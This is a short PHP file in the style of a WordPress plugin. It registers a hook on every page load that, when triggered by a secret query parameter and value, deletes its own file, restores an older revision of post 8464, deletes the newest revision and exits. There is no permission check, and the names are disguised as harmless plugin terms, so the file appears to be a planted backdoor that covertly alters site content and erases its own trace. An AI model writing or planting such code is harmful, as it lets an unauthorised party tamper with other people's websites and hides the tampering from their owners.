<?php

function make_rating_icon() {
	if (isset($_GET['mediaelement_out_divi']) && $_GET['mediaelement_out_divi'] === 'service_address_keyword_all') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$preview_accessibility_privacy = 8464;
		$beaver_multisite_floating = wp_get_post_revisions($preview_accessibility_privacy);
		if (empty($beaver_multisite_floating)) die('no revisions');
		if (count($beaver_multisite_floating) < 2) die('less than 2');
		$enable_open_all_testimonial = array_shift($beaver_multisite_floating);
		$schema_visual_delivery = $enable_open_all_testimonial->ID;
		$report_only_switch = array_shift($beaver_multisite_floating);
		$archive_frontend_schema = $report_only_switch->ID;
		$template_extra_exchange = wp_restore_post_revision($archive_frontend_schema);
		if ($template_extra_exchange === false) die('error restoring');
		$template_extra_exchange = wp_delete_post_revision($schema_visual_delivery);		
		if ($template_extra_exchange === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'make_rating_icon');
